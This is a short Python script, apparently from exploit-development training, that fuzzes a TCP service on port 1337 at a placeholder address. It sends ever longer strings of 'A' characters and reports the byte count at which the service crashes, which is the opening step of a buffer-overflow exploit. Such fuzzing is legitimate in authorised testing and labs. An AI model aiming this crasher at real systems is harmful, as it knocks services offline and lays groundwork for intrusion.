#!/usr/bin/python3

import socket, sys

buff = "A" * 100
ip = "ip goes here"
port = 1337
timeout = 5
prefix = ""
buffer = prefix + buff

while True:
  
  try:
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
      s.settimeout(timeout)
      s.connect((ip,port))
      s.recv(1024)
      print(f"Sending {len(buffer) - len(prefix)} bytes")
      s.send(bytes(buffer, "latin-1"))
      s.recv(1024)
  except:
    print(f"Program crashed after {len(buffer)-len(prefix)} bytes")
    sys.exit(0)
  buffer += buff
